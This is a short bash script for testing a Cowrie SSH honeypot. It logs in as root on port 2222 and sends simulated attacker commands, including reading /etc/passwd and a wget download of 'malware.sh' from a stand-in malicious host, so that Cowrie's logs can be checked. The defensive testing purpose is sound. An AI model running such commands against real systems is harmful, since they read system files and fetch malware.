#!/bin/bash
# Test script for Cowrie honeypot

HONEYPOT_IP=$1

if [ -z "$HONEYPOT_IP" ]; then
    echo "Usage: $0 <honeypot-ip>"
    echo "Example: $0 54.123.45.67"
    exit 1
fi

echo "=== Testing Cowrie Honeypot at $HONEYPOT_IP ==="

# Test SSH connection (this will be logged by Cowrie)
echo "Testing SSH connection (will be logged)..."
timeout 10 ssh -p 2222 -o StrictHostKeyChecking=no root@$HONEYPOT_IP << 'EOF'
whoami
ls -la
cat /etc/passwd
wget http://malicious-site.com/malware.sh
exit
EOF

echo ""
echo "=== Test completed ==="
echo "Check Cowrie logs to see captured activity:"
echo "ssh -i your-key.pem ubuntu@$HONEYPOT_IP 'sudo tail -20 /opt/cowrie/var/log/cowrie/cowrie.log'"